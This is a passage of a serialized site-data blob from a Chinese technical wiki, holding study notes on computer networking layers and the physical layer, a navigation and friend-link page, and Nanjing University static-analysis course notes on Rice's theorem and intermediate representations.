五层体系结构\n\nosi七层的体系结构概念清晰、理论完整，但是并不实用。\n\n\n\n * 应用层：通过进程之间的交互完成特定的网络应用。常见的协议（dns、http、https、smtp等），交换的数据单元为报文。\n * 运输层：两台主机中进程之间的通信提供数据传输服务。主要的协议：传输控制协议（tcp、可靠传输、面向连接、报文段）、数据用户报协议（udp、无连接、最大努力的数据传输、用户数据报）\n * 网络层：负责为分组交换网上的不同主机提供服务。将运输层产生的报文段封装成分组或者包进行传送。网络层使用ip协议，分组称为ip数据报。\n * 数据链路层：称为链路层。将网络层的ip数据报封装成数据帧。mac地址工作的层级。\n * 物理层：传输的是比特。\n\n\n\nosi参考模型把对等层次之间传送的数据单元称为该层的协议数据单元pdu\n\n\n# tcp/ip体系结构\n\ntcp/ip只由四层结构。\n\n\n\n但是技术的发展并没有严格遵循这个体系结构。如下图所示：\n\n",charsets:{cjk:!0},lastUpdated:"2022/05/06, 15:57:40",lastUpdatedTimestamp:165185266e4},{title:"【计算机网络】物理层",frontmatter:{title:"【计算机网络】物理层",date:"2022-05-06T00:00:00.000Z",permalink:"/dev/basic/network/physicallayer",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["开发","计算机基础","计算机网络"],tags:["计算机网络"],readingShow:"top"},regularPath:"/01.%E5%BC%80%E5%8F%91/102.%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/1021.%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/01.%E7%89%A9%E7%90%86%E5%B1%82.html",relativePath:"01.开发/102.计算机基础/1021.计算机网络/01.物理层.md",key:"v-60fcebe2",path:"/dev/basic/network/physicallayer/",headers:[{level:2,title:"物理层的基本概念",slug:"物理层的基本概念",normalizedTitle:"物理层的基本概念",charIndex:45},{level:2,title:"数据通信基础知识",slug:"数据通信基础知识",normalizedTitle:"数据通信基础知识",charIndex:229},{level:3,title:"数据通信的模型",slug:"数据通信的模型",normalizedTitle:"数据通信的模型",charIndex:242},{level:3,title:"信道的基本概念",slug:"信道的基本概念",normalizedTitle:"信道的基本概念",charIndex:373},{level:3,title:"信道的极限容量",slug:"信道的极限容量",normalizedTitle:"信道的极限容量",charIndex:772},{level:2,title:"物理层的传输媒介",slug:"物理层的传输媒介",normalizedTitle:"物理层的传输媒介",charIndex:864},{level:3,title:"导引型传输媒体",slug:"导引型传输媒体",normalizedTitle:"导引型传输媒体",charIndex:888},{level:3,title:"非引导型传输媒体",slug:"非引导型传输媒体",normalizedTitle:"非引导型传输媒体",charIndex:1154},{level:2,title:"信道复用技术",slug:"信道复用技术",normalizedTitle:"信道复用技术",charIndex:1301},{level:3,title:"频分复用、时分复用、统计时分复用",slug:"频分复用、时分复用、统计时分复用",normalizedTitle:"频分复用、时分复用、统计时分复用",charIndex:1342},{level:3,title:"波分复用",slug:"波分复用",normalizedTitle:"波分复用",charIndex:1674},{level:3,title:"码分复用",slug:"码分复用",normalizedTitle:"码分复用",charIndex:1700},{level:2,title:"宽带接入技术",slug:"宽带接入技术",normalizedTitle:"宽带接入技术",charIndex:1758},{level:3,title:"ADSL技术",slug:"adsl技术",normalizedTitle:"adsl技术",charIndex:1769},{level:3,title:"光纤同轴混合网（HFC）",slug:"光纤同轴混合网-hfc",normalizedTitle:"光纤同轴混合网（hfc）",charIndex:1828},{level:3,title:"FTTx技术",slug:"fttx技术",normalizedTitle:"fttx技术",charIndex:1876}],excerpt:'<h1 id="物理层"><a class="header-anchor" href="#物理层">#</a> 物理层</h1>\n<blockquote>\n<p>物理层定义了传输媒介的机械特性、电气特性、功能特性、过程特性。</p>\n</blockquote>\n',headersStr:"物理层的基本概念 数据通信基础知识 数据通信的模型 信道的基本概念 信道的极限容量 物理层的传输媒介 导引型传输媒体 非引导型传输媒体 信道复用技术 频分复用、时分复用、统计时分复用 波分复用 码分复用 宽带接入技术 ADSL技术 光纤同轴混合网（HFC） FTTx技术",content:"# 物理层\n\n> 物理层定义了传输媒介的机械特性、电气特性、功能特性、过程特性。\n\n\n# 物理层的基本概念\n\n> 物理层的作用是尽可能的屏蔽掉传输媒介之间的差异，使物理层上面的链路层感受不到这些差异。\n> \n> 物理层定义了传输媒介的机械特性、电气特性、功能特性、过程特性。\n\n * 机械特性：接口所用的接线器的尺寸、形状、针脚、排列、锁定等\n * 电气特性：指接口电缆的典雅范围\n * 功能特性：电平的含义\n * 过程特性：事件的发生出现的顺序。\n\n\n# 数据通信基础知识\n\n\n# 数据通信的模型\n\n一个数据通信系统可以分为三个部分：源系统、目的系统。\n\n\n\n通信的目的是传送消息（话音、文字、图像、视频等），数据是运送消息的实体。信号是数据的电气或者电磁的表现。\n\n信号分为两大类：\n\n * 模拟信号：连续的\n * 数字信号：离散的\n\n\n# 信道的基本概念\n\n从通信双方的信息交互可以分为三种方式：\n\n * 单向通信：单工 - 电视机、电台\n * 双向交替通信：半双工 - 对讲机\n * 双向同时通信：全双工 - 打电话\n\n来自信源的信号称为基带信号，对与基带信号的调制分为两类：\n\n * 基带调制：仅仅对波形进行变换，结果还是基带信号 （编码）\n * 带通调制：使用载波的方式进行调制，将基带信号的范围搬迁到高频段，并转换为模拟信号，转换后的信号称为 带通信号。\n\n# 常用编码方式\n\n * 不归零制：正1 负 0\n * 归零制：正脉冲 1 负脉冲 0\n * 曼彻斯特编码：位周期中心的向上跳变代表0，位于周期中心的向下跳变代表1\n * 查分曼彻斯特编码：每一位的中心都有跳变，位于开始边界有跳变代表0，没有跳变代表1\n\n\n\n# 基本的带通调制方法\n\n * 调幅：振幅变化\n * 调频：载波频率变化\n * 调相：相位发生变化\n\n\n\n\n# 信道的极限容量\n\n限制码元在信道上的传输速率的因素：\n\n * 信道能够通过的频率范围。\n * 信噪比\n\n香农公式：信道的带宽或者信道中的信噪比越大，信息的极限传输速率就越高。\n\n\n# 物理层的传输媒介\n\n> 传输媒介可以分为两大类：导引型传输媒体、非导引型传输媒体。\n\n\n\n\n# 导引型传输媒体\n\n# 双绞线\n\n屏蔽双绞线（STP）\n\n非屏蔽双绞线（UTP）\n\n\n\n双绞线的标准：\n\n\n\n# 同轴电缆\n\n同轴电缆由导体铜质芯线、绝缘层、网状编制外导体屏蔽层以及塑料外层组成。抗干扰能力强。\n\n\n\n# 光缆\n\n光缆依靠的是光传播信号。\n\n\n\n光在光纤中的传播是不断的全反射实现的。\n\n\n\n光纤分为两种：\n\n * 多模光纤\n   \n   可以存在多条不同角度入射的光在一条光纤中传播。适合远距离。\n\n * 单模光纤\n   \n   单模光纤成本高，损耗小。\n\n\n\n\n# 非引导型传输媒体\n\n非引导型传输媒体主要是无线电，无线电的频段划分如下：\n\n * 甚高频（30-300MHZ）\n * 特高频（300-3GHz）\n * 超高频（3-30GHZ）\n * 极高频（30-300GHZ）\n\n传统的微波通信方式主要有两种：\n\n * 地面微波接力\n * 卫星通信\n\n\n# 信道复用技术\n\n> 复用是通信技术中的基本概念。使用共享的信道传送数据。\n\n\n# 频分复用、时分复用、统计时分复用\n\n最基本的复用技术就是频分复用FDM和时分复用TDM。频分复用最简单，用户分配到一定的频带之后，始终占用这个频带。时分复用则是将时间划分为等长的时分复用帧TDM帧。每个用户使用一段时间的间隙。十分服用在不同的时间使用相同的频带宽度。\n\n\n\n在使用频分复用时，如果用户占用的带宽不变，当用户增多时，服用的信道总带宽变宽。但是在时分复用时，每个用户复用的帧长度时不变的，如果用户增多，则每个用户的分时间间隙变得非常窄。\n\n在进行通信时，复用器和分用器往往成对使用。\n\n时分复用当某个用户在某一时间段不发送数据时，仍然占用TDM帧，因此会造成资源浪费。\n\n\n\n统计时分复用SRDM是一种改进的时分复用，提高了信道的利用率。\n\n\n\n\n# 波分复用\n\n波分复用WDM是光的频分复用。\n\n\n# 码分复用\n\n码分复用CDM是一种共享信道的方法，通常更常见的名次是CDMA，使用在移动设备和基站的通信中。\n\n\n# 宽带接入技术\n\n\n# ADSL技术\n\n非对成数字用户线ADSL是用数字技术对现有的模拟电话用户线路进行改造，承载数字数字业务。\n\n\n\n\n# 光纤同轴混合网（HFC）\n\n在目前覆盖面很广的有限电视基础之上开发的居民接入技术。\n\n\n\n\n# FTTx技术\n\n光纤到户FTTH",normalizedContent:"# 物理层\n\n> 物理层定义了传输媒介的机械特性、电气特性、功能特性、过程特性。\n\n\n# 物理层的基本概念\n\n> 物理层的作用是尽可能的屏蔽掉传输媒介之间的差异，使物理层上面的链路层感受不到这些差异。\n> \n> 物理层定义了传输媒介的机械特性、电气特性、功能特性、过程特性。\n\n * 机械特性：接口所用的接线器的尺寸、形状、针脚、排列、锁定等\n * 电气特性：指接口电缆的典雅范围\n * 功能特性：电平的含义\n * 过程特性：事件的发生出现的顺序。\n\n\n# 数据通信基础知识\n\n\n# 数据通信的模型\n\n一个数据通信系统可以分为三个部分：源系统、目的系统。\n\n\n\n通信的目的是传送消息（话音、文字、图像、视频等），数据是运送消息的实体。信号是数据的电气或者电磁的表现。\n\n信号分为两大类：\n\n * 模拟信号：连续的\n * 数字信号：离散的\n\n\n# 信道的基本概念\n\n从通信双方的信息交互可以分为三种方式：\n\n * 单向通信：单工 - 电视机、电台\n * 双向交替通信：半双工 - 对讲机\n * 双向同时通信：全双工 - 打电话\n\n来自信源的信号称为基带信号，对与基带信号的调制分为两类：\n\n * 基带调制：仅仅对波形进行变换，结果还是基带信号 （编码）\n * 带通调制：使用载波的方式进行调制，将基带信号的范围搬迁到高频段，并转换为模拟信号，转换后的信号称为 带通信号。\n\n# 常用编码方式\n\n * 不归零制：正1 负 0\n * 归零制：正脉冲 1 负脉冲 0\n * 曼彻斯特编码：位周期中心的向上跳变代表0，位于周期中心的向下跳变代表1\n * 查分曼彻斯特编码：每一位的中心都有跳变，位于开始边界有跳变代表0，没有跳变代表1\n\n\n\n# 基本的带通调制方法\n\n * 调幅：振幅变化\n * 调频：载波频率变化\n * 调相：相位发生变化\n\n\n\n\n# 信道的极限容量\n\n限制码元在信道上的传输速率的因素：\n\n * 信道能够通过的频率范围。\n * 信噪比\n\n香农公式：信道的带宽或者信道中的信噪比越大，信息的极限传输速率就越高。\n\n\n# 物理层的传输媒介\n\n> 传输媒介可以分为两大类：导引型传输媒体、非导引型传输媒体。\n\n\n\n\n# 导引型传输媒体\n\n# 双绞线\n\n屏蔽双绞线（stp）\n\n非屏蔽双绞线（utp）\n\n\n\n双绞线的标准：\n\n\n\n# 同轴电缆\n\n同轴电缆由导体铜质芯线、绝缘层、网状编制外导体屏蔽层以及塑料外层组成。抗干扰能力强。\n\n\n\n# 光缆\n\n光缆依靠的是光传播信号。\n\n\n\n光在光纤中的传播是不断的全反射实现的。\n\n\n\n光纤分为两种：\n\n * 多模光纤\n   \n   可以存在多条不同角度入射的光在一条光纤中传播。适合远距离。\n\n * 单模光纤\n   \n   单模光纤成本高，损耗小。\n\n\n\n\n# 非引导型传输媒体\n\n非引导型传输媒体主要是无线电，无线电的频段划分如下：\n\n * 甚高频（30-300mhz）\n * 特高频（300-3ghz）\n * 超高频（3-30ghz）\n * 极高频（30-300ghz）\n\n传统的微波通信方式主要有两种：\n\n * 地面微波接力\n * 卫星通信\n\n\n# 信道复用技术\n\n> 复用是通信技术中的基本概念。使用共享的信道传送数据。\n\n\n# 频分复用、时分复用、统计时分复用\n\n最基本的复用技术就是频分复用fdm和时分复用tdm。频分复用最简单，用户分配到一定的频带之后，始终占用这个频带。时分复用则是将时间划分为等长的时分复用帧tdm帧。每个用户使用一段时间的间隙。十分服用在不同的时间使用相同的频带宽度。\n\n\n\n在使用频分复用时，如果用户占用的带宽不变，当用户增多时，服用的信道总带宽变宽。但是在时分复用时，每个用户复用的帧长度时不变的，如果用户增多，则每个用户的分时间间隙变得非常窄。\n\n在进行通信时，复用器和分用器往往成对使用。\n\n时分复用当某个用户在某一时间段不发送数据时，仍然占用tdm帧，因此会造成资源浪费。\n\n\n\n统计时分复用srdm是一种改进的时分复用，提高了信道的利用率。\n\n\n\n\n# 波分复用\n\n波分复用wdm是光的频分复用。\n\n\n# 码分复用\n\n码分复用cdm是一种共享信道的方法，通常更常见的名次是cdma，使用在移动设备和基站的通信中。\n\n\n# 宽带接入技术\n\n\n# adsl技术\n\n非对成数字用户线adsl是用数字技术对现有的模拟电话用户线路进行改造，承载数字数字业务。\n\n\n\n\n# 光纤同轴混合网（hfc）\n\n在目前覆盖面很广的有限电视基础之上开发的居民接入技术。\n\n\n\n\n# fttx技术\n\n光纤到户ftth",charsets:{cjk:!0},lastUpdated:"2022/05/06, 15:57:40",lastUpdatedTimestamp:165185266e4},{title:"站点导航",frontmatter:{title:"站点导航",date:"2019-12-25T14:27:01.000Z",permalink:"/navigation",article:!1,sidebar:!0,readingShow:"top"},regularPath:"/01.%E7%AB%99%E7%82%B9%E5%AF%BC%E8%88%AA.html",relativePath:"01.站点导航.md",key:"v-bfe23564",path:"/navigation/",headers:[{level:2,title:"友链申请",slug:"友链申请",normalizedTitle:"友链申请",charIndex:2},{level:2,title:"搜索引擎",slug:"搜索引擎",normalizedTitle:"搜索引擎",charIndex:253},{level:2,title:"代码托管",slug:"代码托管",normalizedTitle:"代码托管",charIndex:262},{level:2,title:"前端开发",slug:"前端开发",normalizedTitle:"前端开发",charIndex:271},{level:2,title:"后端开发",slug:"后端开发",normalizedTitle:"后端开发",charIndex:280},{level:2,title:"文档工具",slug:"文档工具",normalizedTitle:"文档工具",charIndex:289},{level:2,title:"热门社区",slug:"热门社区",normalizedTitle:"热门社区",charIndex:298},{level:2,title:"工具合集",slug:"工具合集",normalizedTitle:"工具合集",charIndex:307},{level:2,title:"文档教程",slug:"文档教程",normalizedTitle:"文档教程",charIndex:316},{level:2,title:"动态图表",slug:"动态图表",normalizedTitle:"动态图表",charIndex:325},{level:2,title:"图片图标",slug:"图片图标",normalizedTitle:"图片图标",charIndex:334},{level:2,title:"CSS样式",slug:"css样式",normalizedTitle:"css样式",charIndex:343},{level:2,title:"网站分析",slug:"网站分析",normalizedTitle:"网站分析",charIndex:353},{level:2,title:"其它资源",slug:"其它资源",normalizedTitle:"其它资源",charIndex:362},{level:2,title:"参考来源",slug:"参考来源",normalizedTitle:"参考来源",charIndex:371}],headersStr:"友链申请 搜索引擎 代码托管 前端开发 后端开发 文档工具 热门社区 工具合集 文档教程 动态图表 图片图标 CSS样式 网站分析 其它资源 参考来源",content:"# 友链申请\n\n与我 联系 或者 在本页面评论区留言您的友链信息，格式：(点击代码块右上角一键复制)\n\n- name: 上校的玩具间 # 昵称\n  desc: 欲饮桂花同载酒、终不似少年游 # 介绍\n  avatar: https://wiki-1251603812.cos.ap-shanghai.myqcloud.com/images/avatar.jpg # 头像\n  link: https://wiki.pwddd.com/  # 链接\n\n\n1\n2\n3\n4\n\n\n申请前记得先添加本站哦~\n\n\n# 搜索引擎\n\n\n# 代码托管\n\n\n# 前端开发\n\n\n# 后端开发\n\n\n# 文档工具\n\n\n# 热门社区\n\n\n# 工具合集\n\n\n# 文档教程\n\n\n# 动态图表\n\n\n# 图片图标\n\n\n# CSS样式\n\n\n# 网站分析\n\n\n# 其它资源\n\n\n# 参考来源\n\nhttps://www.pdai.tech/md/resource/tools.html",normalizedContent:"# 友链申请\n\n与我 联系 或者 在本页面评论区留言您的友链信息，格式：(点击代码块右上角一键复制)\n\n- name: 上校的玩具间 # 昵称\n  desc: 欲饮桂花同载酒、终不似少年游 # 介绍\n  avatar: https://wiki-1251603812.cos.ap-shanghai.myqcloud.com/images/avatar.jpg # 头像\n  link: https://wiki.pwddd.com/  # 链接\n\n\n1\n2\n3\n4\n\n\n申请前记得先添加本站哦~\n\n\n# 搜索引擎\n\n\n# 代码托管\n\n\n# 前端开发\n\n\n# 后端开发\n\n\n# 文档工具\n\n\n# 热门社区\n\n\n# 工具合集\n\n\n# 文档教程\n\n\n# 动态图表\n\n\n# 图片图标\n\n\n# css样式\n\n\n# 网站分析\n\n\n# 其它资源\n\n\n# 参考来源\n\nhttps://www.pdai.tech/md/resource/tools.html",charsets:{cjk:!0},lastUpdated:"2022/12/08, 01:19:27",lastUpdatedTimestamp:1670462367e3},{title:"SA - Introduction",frontmatter:{title:"SA - Introduction",date:"2022-02-01T00:00:00.000Z",permalink:"/sec/sa/nju/introduction",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["静态分析","南京大学课程笔记"],tags:["PL","SA"],readingShow:"top"},regularPath:"/02.%E5%AE%89%E5%85%A8/200.%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/2000.%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/00.Introduction.html",relativePath:"02.安全/200.静态分析/2000.南京大学课程笔记/00.Introduction.md",key:"v-290ff5e0",path:"/sec/sa/nju/introduction/",headers:[{level:2,title:"PL and Static Analysis",slug:"pl-and-static-analysis",normalizedTitle:"pl and static analysis",charIndex:19},{level:2,title:"Why We Need Static Analysis?",slug:"why-we-need-static-analysis",normalizedTitle:"why we need static analysis?",charIndex:459},{level:2,title:"What is Static Analysis",slug:"what-is-static-analysis",normalizedTitle:"what is static analysis",charIndex:653},{level:3,title:"Rice's Theorem",slug:"rice-s-theorem",normalizedTitle:"rice's theorem",charIndex:945},{level:3,title:"举个栗子解释静态分析",slug:"举个栗子解释静态分析",normalizedTitle:"举个栗子解释静态分析",charIndex:2234},{level:2,title:"课程计划",slug:"课程计划",normalizedTitle:"课程计划",charIndex:2684},{level:2,title:"相关资源",slug:"相关资源",normalizedTitle:"相关资源",charIndex:2853}],headersStr:"PL and Static Analysis Why We Need Static Analysis? What is Static Analysis Rice's Theorem 举个栗子解释静态分析 课程计划 相关资源",content:"# Introduction\n\n\n# PL and Static Analysis\n\nPL(Programming Languages) 分为三部分：\n\n * 理论(Theory)\n   * 语言设计\n   * 类型系统\n   * 形式语义\n   * 程序逻辑\n   * 解决的问题：怎么构建语言？\n * 环境(Environment)\n   * 编译器\n   * 运行系统\n   * 解决的问题：支撑语言运行\n * 应用(Application)\n   * 程序分析 ：从PL角度来看，程序分析指的是静态分析\n   * 程序验证\n   * 程序合成\n   * 解决的问题：可靠的、安全的、高效的程序\n\n\n\n多年以来，语言的核心部分并没有太大的变化，无非三类：\n\n * 命令式（java，c)，一条一条指令执行；\n * 函数式（python，js），将逻辑包装形式化；\n * 逻辑式\n\n语用环境发生了变化，随着需求的复杂化，程序也越来越复杂。新的挑战就是：如何去保证复杂的软件的可靠性、安全性和一些其他性能。\n\n\n# Why We Need Static Analysis?\n\n静态分析的作用：\n\n * 可靠性：空指针引用、内存泄漏等\n * 应用安全：隐私保护、注入等\n * 编译优化：提升运行速度（死代码删除、代码位置调整等）\n * 程序理解：IDE的提示等\n\n静态分析的市场有多大？\n\n\n\n好处之一，可以更好的深入了解编程语言的语法和语义。之二便是自然而然的会写出可靠的、安全的、高效的程序。\n\n\n# What is Static Analysis\n\n> Static analysis analyzes a program P to reason about its behaviors and determines whether it satisfies some properties before running P.\n\n在程序运行之前了解程序相关的行为，并且关于程序相关的性质能否得到满足。说白了就是写一个分析器，在运行程序之前分析程序的行为。比如说，程序是否存在信息泄露、空指针引用、强转是否安全、任意的两个变量是否指向同一块地址(条件竞争)、死代码等等的问题。\n\n\n# Rice's Theorem\n\n> Unfortunately, by Rice’s Theorem, there is no such approach to determine whether P satisfies such non-trivial properties, i.e., giving exact answer: Yes or No\n\n非常遗憾的是 如Rice定理所言：对于以上的问题，不存在一个方法能够给出一个准确的判断。\n\n> “Any non-trivial property of the behavior of programs in a r.e. language is undecidable.”\n\nr.e. language : 递归可枚举的语言，现代的几乎所有语言都是递归可枚举的。 正常的语言编写的程序中，给出我们关注的问题（空指针引用等）的一个准确的答案是不可能的。\n\n> A property is trivial if either it is not satisfied by any r.e. language, or if it is satisfied by all r.e. languages; otherwise it is non-trivial.\n\nnon-trival: 我们关注的诸多特殊的问题。\n\n以上的结论告诉我们：不存在 perfect static analysis。\n\n一个perfect static analysis，是既sound又Complate。举个栗子，一个程序中存在10个空指针引用的问题（虽然根据Rice定理，不存在一个方法能够得出这个答案），这10个问题就是Truth的，但是我们的方法可以Sound或者Complete。Sound的意思是：我们可以找到20个，包含10个正确的；Complete的意思是：我们可以找到5个，但是这5个都是正确的。\n\n\n\n那么既然不存在perfect static analysis，我们的静态分析有什么意义？\n\nUseful static analysis：妥协其中一方，得到的静态分析结果\n\n * Compromise soundness ： (false positives) 误报\n * Compromise completeness：(false negatives) 漏报\n\n\n\n在真正的静态分析中，都是妥协complete。可以不精确，但是一定要sound。宁可错杀一千，也不放过一个。\n\nSoundness可以理解为正确的。只有在全面分析之后，才有可能得到一个正确的结论。\n\n> Static Analysis: ensure (or get close to) soundness, while making good trade-offs between analysis precision and analysis speed.\n\n宏观的概括静态分析：确保soundness的情况下，在速度和精度上做一个动态的平衡。\n\n\n# 举个栗子解释静态分析\n\n分析程序中变量的符号。虽然简单，但是这个例子可以判断除零错误、索引越界等。\n\n# 抽象(Abstract)\n\n\n\n# 过近似(Over-approximation)\n\n在抽象值之上，针对程序中的每一个语句做转换规则。转换规则根据你的目标和程序中的语义设计规则。\n\n\n\n# Transfer functions\n\n> Transfer functions are defined according to “analysis problem” and the “semantics” of different program statements.\n\n> In static analysis, transfer functions define how to evaluate different program statements on abstract values.\n\n\n\n# Control Flows\n\nControl Flow汇聚的地方都要做合并。\n\n\n\n\n# 课程计划\n\n\n\n 1.  简介\n 2.  中间表达 - [[IR]]\n 3.  数据流分析\n 4.  过程分析\n 5.  CFL & IFDS\n 6.  前沿Topic - Soundiness & Soundness\n 7.  指针分析\n 8.  静态分析安全应用\n 9.  Datalog分析\n 10. 抽象解释\n\n实验\n\n\n\n\n# 相关资源\n\n名称                     地址\n南京大学-软件分析课             甜品专家_bilibili\n软件分析作业                 nju-sa-homework\nPL相关资源                 PL资源\nYingfei Xiong's Blog   Yingfei Xiong\n南大软件分析课PDF             课件下载",normalizedContent:"# introduction\n\n\n# pl and static analysis\n\npl(programming languages) 分为三部分：\n\n * 理论(theory)\n   * 语言设计\n   * 类型系统\n   * 形式语义\n   * 程序逻辑\n   * 解决的问题：怎么构建语言？\n * 环境(environment)\n   * 编译器\n   * 运行系统\n   * 解决的问题：支撑语言运行\n * 应用(application)\n   * 程序分析 ：从pl角度来看，程序分析指的是静态分析\n   * 程序验证\n   * 程序合成\n   * 解决的问题：可靠的、安全的、高效的程序\n\n\n\n多年以来，语言的核心部分并没有太大的变化，无非三类：\n\n * 命令式（java，c)，一条一条指令执行；\n * 函数式（python，js），将逻辑包装形式化；\n * 逻辑式\n\n语用环境发生了变化，随着需求的复杂化，程序也越来越复杂。新的挑战就是：如何去保证复杂的软件的可靠性、安全性和一些其他性能。\n\n\n# why we need static analysis?\n\n静态分析的作用：\n\n * 可靠性：空指针引用、内存泄漏等\n * 应用安全：隐私保护、注入等\n * 编译优化：提升运行速度（死代码删除、代码位置调整等）\n * 程序理解：ide的提示等\n\n静态分析的市场有多大？\n\n\n\n好处之一，可以更好的深入了解编程语言的语法和语义。之二便是自然而然的会写出可靠的、安全的、高效的程序。\n\n\n# what is static analysis\n\n> static analysis analyzes a program p to reason about its behaviors and determines whether it satisfies some properties before running p.\n\n在程序运行之前了解程序相关的行为，并且关于程序相关的性质能否得到满足。说白了就是写一个分析器，在运行程序之前分析程序的行为。比如说，程序是否存在信息泄露、空指针引用、强转是否安全、任意的两个变量是否指向同一块地址(条件竞争)、死代码等等的问题。\n\n\n# rice's theorem\n\n> unfortunately, by rice’s theorem, there is no such approach to determine whether p satisfies such non-trivial properties, i.e., giving exact answer: yes or no\n\n非常遗憾的是 如rice定理所言：对于以上的问题，不存在一个方法能够给出一个准确的判断。\n\n> “any non-trivial property of the behavior of programs in a r.e. language is undecidable.”\n\nr.e. language : 递归可枚举的语言，现代的几乎所有语言都是递归可枚举的。 正常的语言编写的程序中，给出我们关注的问题（空指针引用等）的一个准确的答案是不可能的。\n\n> a property is trivial if either it is not satisfied by any r.e. language, or if it is satisfied by all r.e. languages; otherwise it is non-trivial.\n\nnon-trival: 我们关注的诸多特殊的问题。\n\n以上的结论告诉我们：不存在 perfect static analysis。\n\n一个perfect static analysis，是既sound又complate。举个栗子，一个程序中存在10个空指针引用的问题（虽然根据rice定理，不存在一个方法能够得出这个答案），这10个问题就是truth的，但是我们的方法可以sound或者complete。sound的意思是：我们可以找到20个，包含10个正确的；complete的意思是：我们可以找到5个，但是这5个都是正确的。\n\n\n\n那么既然不存在perfect static analysis，我们的静态分析有什么意义？\n\nuseful static analysis：妥协其中一方，得到的静态分析结果\n\n * compromise soundness ： (false positives) 误报\n * compromise completeness：(false negatives) 漏报\n\n\n\n在真正的静态分析中，都是妥协complete。可以不精确，但是一定要sound。宁可错杀一千，也不放过一个。\n\nsoundness可以理解为正确的。只有在全面分析之后，才有可能得到一个正确的结论。\n\n> static analysis: ensure (or get close to) soundness, while making good trade-offs between analysis precision and analysis speed.\n\n宏观的概括静态分析：确保soundness的情况下，在速度和精度上做一个动态的平衡。\n\n\n# 举个栗子解释静态分析\n\n分析程序中变量的符号。虽然简单，但是这个例子可以判断除零错误、索引越界等。\n\n# 抽象(abstract)\n\n\n\n# 过近似(over-approximation)\n\n在抽象值之上，针对程序中的每一个语句做转换规则。转换规则根据你的目标和程序中的语义设计规则。\n\n\n\n# transfer functions\n\n> transfer functions are defined according to “analysis problem” and the “semantics” of different program statements.\n\n> in static analysis, transfer functions define how to evaluate different program statements on abstract values.\n\n\n\n# control flows\n\ncontrol flow汇聚的地方都要做合并。\n\n\n\n\n# 课程计划\n\n\n\n 1.  简介\n 2.  中间表达 - [[ir]]\n 3.  数据流分析\n 4.  过程分析\n 5.  cfl & ifds\n 6.  前沿topic - soundiness & soundness\n 7.  指针分析\n 8.  静态分析安全应用\n 9.  datalog分析\n 10. 抽象解释\n\n实验\n\n\n\n\n# 相关资源\n\n名称                     地址\n南京大学-软件分析课             甜品专家_bilibili\n软件分析作业                 nju-sa-homework\npl相关资源                 pl资源\nyingfei xiong's blog   yingfei xiong\n南大软件分析课pdf             课件下载",charsets:{cjk:!0},lastUpdated:"2022/04/03, 12:13:15",lastUpdatedTimestamp:1648987995e3},{title:"SA - IR",frontmatter:{title:"SA - IR",date:"2022-02-06T00:00:00.000Z",permalink:"/sec/sa/nju/ir",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["静态分析","南京大学课程笔记"],tags:["PL","SA","IR"],readingShow:"top"},regularPath:"/02.%E5%AE%89%E5%85%A8/200.%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/2000.%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/01.IR.html",relativePath:"02.安全/200.静态分析/2000.南京大学课程笔记/01.IR.md",key:"v-cba31118",path:"/sec/sa/nju/ir/",headers:[{level:2,title:"Compilers and Static Analyzers",slug:"compilers-and-static-analyzers",normalizedTitle:"compilers and static analyzers",charIndex:137},{level:3,title:"Compiler",slug:"compiler",normalizedTitle:"compiler",charIndex:137},{level:2,title:"AST vs. IR",slug:"ast-vs-ir",normalizedTitle:"ast vs. ir",charIndex:777},{level:2,title:"IR: Three-Address Code (3AC)",slug:"ir-three-address-code-3ac",normalizedTitle:"ir: three-address code (3ac)",charIndex:1272},{level:2,title:"3AC in Real Static Analyzer: Soot",slug:"_3ac-in-real-static-analyzer-soot",normalizedTitle:"3ac in real static analyzer: soot",charIndex:1622},{level:2,title:"Static Single Assignment (SSA)",slug:"static-single-assignment-ssa",normalizedTitle:"static single assignment (ssa)",charIndex:3064},{level:2,title:"Basic Blocks (BB)",slug:"basic-blocks-bb",normalizedTitle:"basic blocks (bb)",charIndex:3223},{level:2,title:"Control Flow Graphs (CFG)",slug:"control-flow-graphs-cfg",normalizedTitle:"control flow graphs (cfg)",charIndex:3492}],headersStr:"Compilers and Static Analyzers Compiler AST vs. IR IR: Three-Address Code (3AC) 3AC in Real Static Analyzer: Soot Static Single Assignment (SSA) Basic Blocks (BB) Control Flow Graphs (CFG)",content:"# IR\n\n> 在编译原理时，我们用抽象语法树去作为中间表示形式。静态分析器也需要一种程序的表示形式，这个表示格式需要时简便的、利于静态分析算法的设计的。真正好的IR也并没有严格的定义。绝大部分静态分析器的IR应该是一个什么样子？源程序-> IR -> 后续分析。\n\n\n# Compilers and Static Analyzers\n\n\n# Compiler\n\n将Source Code翻译转换为Machine Code的过程中，识别源代码中的错误。\n\n编译的过程：\n\n 1. Scanner - 词法分析 Lexical Analysis 词法分析的规则描述形式化的方法是：Regular Expression。将合法的单词生成Tokens。\n 2. Parser - 语法分析 Syntax Analysis 将词法分析生成的Tokens交给语法分析器，使用Context-Free Grammer（上下文无关文法）。将合法的程序生成AST（抽象语法树）\n 3. Type Checker - 语义分析 Semantic Analysis 利用抽象语法树对语义进行分析，从编译器的角度将，只能做简单的检查，如：类型检查。形式化语言是：Attribute Grammer。生成Decorated AST。\n 4. Translator - 编译优化 如果还需要优化等操作，需要将上一步生成的结果转化为IR（通常为三地址码），并进行Static Analysis。\n 5. CodeGenerator - 生成机器码\n\n那么能不能直接将源程序生成三地址码的IR，进行静态分析呢？不行的，我们关注的问题是一个相对高级的内容，如果基本的词法、语法等都无法通过，后续也没有什么意义。因此，我们的静态分析是建立在一个通过了前端的校验的合法IR之上的。\n\n\n# AST vs. IR\n\n为什么要用三地址码的IR呢？AST不能解决问题吗？\n\nAST                                IR\nhigh-level                         low-level\nclosed to grammar structure        closed to machine code\nusually language dependent         usually language independent\nsuitable for fast type checking    compact and uniform\nlack of control flow information   contains control flow information\n                                   usually considered as the basis for static analysis\n\n以上的三地址码利于静态分析的特性，导致静态分析通常基于IR进行分析。\n\n\n# IR: 